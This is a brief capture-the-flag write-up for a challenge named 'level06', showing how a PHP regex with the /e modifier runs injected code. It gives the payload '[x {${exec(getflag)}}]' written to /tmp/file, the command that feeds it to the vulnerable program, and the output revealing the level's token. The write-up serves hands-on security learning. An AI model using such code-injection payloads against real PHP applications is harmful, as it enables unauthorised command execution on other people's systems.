# level06

- By checking `level06.php` we can see a `/e` regex that execute the code inside

- We can write to a file in tmp `/tmp/file`
    > [x {${exec(getflag)}}]

- `$ level06 /tmp/file`
    > PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
    > PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

